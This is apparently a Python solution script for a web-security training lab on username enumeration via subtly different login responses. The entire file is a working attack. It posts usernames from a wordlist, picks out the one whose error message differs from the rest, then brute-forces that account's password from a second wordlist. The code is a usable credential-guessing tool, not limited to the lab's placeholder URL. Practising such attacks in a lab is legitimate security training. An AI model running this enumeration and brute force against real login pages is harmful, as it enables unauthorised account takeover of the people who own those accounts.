## Lab: Username enumeration via subtly different responses 

import requests
from bs4 import BeautifulSoup

def extract_error_message(response_text):
    soup = BeautifulSoup(response_text, "html.parser")
    # Find the specific tag containing the error message
    error_tag = soup.find("p", {"class": "is-warning"})
    if error_tag:
        return error_tag.text.strip()
    return None

def check_username_responses(url, password="invalid-password"):
    usernames = []

    with open("res/usernames.txt", "r") as file:
        for line in file:
            usernames.append(line.strip())
                
    responses = {}

    for username in usernames:
        try:
            data = {"username": username, "password": password}
            response = requests.post(url, data=data, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

        error_message = extract_error_message(response.text)
        responses[username] = error_message
    return responses

def display_all_responses(responses):
    print("Unique Responses:")
    for username, message in responses.items():
        print(f"Username: {username}")
        print(f"Response:\n{message}")
        print("-" * 50)
        
def find_and_display_outliers(responses):
    display_all_responses(responses)
    
    # Get the most common response
    common_response = max(set(responses.values()), key=list(responses.values()).count)

    # Compare each response to the common response
    print("Outliers:")
    for username, message in responses.items():
        if message != common_response:  # If it doesn't match the most common response
            print(f"Outlier! Username: {username}, Response: {message}")
            return username

def find_valid_password(url, valid_username):
    passwords = []
    
    with open("res/passwords.txt", "r") as file:
        for line in file:
            passwords.append(line.strip())

    for password in passwords:
        data = {"username": valid_username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=10)
            print(f"Trying password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue
            
        if "Invalid username or password" not in response.text:
            print(f"Valid password found: {password}")
            return password

        
## Lab: Username enumeration via subtly different responses 
       
url = "<lab url here>"

responses = check_username_responses(url)

username = find_and_display_outliers(responses)

find_valid_password(url, username)